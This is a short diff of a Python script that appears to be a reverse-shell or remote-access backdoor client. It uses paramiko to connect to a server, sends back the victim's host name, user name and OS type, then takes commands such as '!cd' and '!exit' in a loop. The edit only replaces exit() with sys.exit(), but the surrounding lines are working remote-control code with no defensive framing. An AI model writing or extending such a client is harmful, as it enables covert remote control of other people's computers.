@@ -1,6 +1,7 @@
 import paramiko
 import subprocess
 import os
+import sys
 import socket
 import getpass
 import argparse
@@ -32,7 +33,7 @@ def main():
         type = os.name
     except Exception as ex:
         print("[!] Unable to connect to server. Use -h for help.")
-        exit()
+        sys.exit()
 
     if session.active:
         session.sendall(f"{host},{user},{type}")
@@ -42,7 +43,7 @@ def main():
                 incoming = session.recv(1024).decode()
                 head = incoming.split(" ")[0]
                 if head == "!exit":
-                    exit()
+                    sys.exit()
                 elif head == "!cd":
                     path = " ".join(incoming.split(" ")[1:])
                     os.chdir(path)
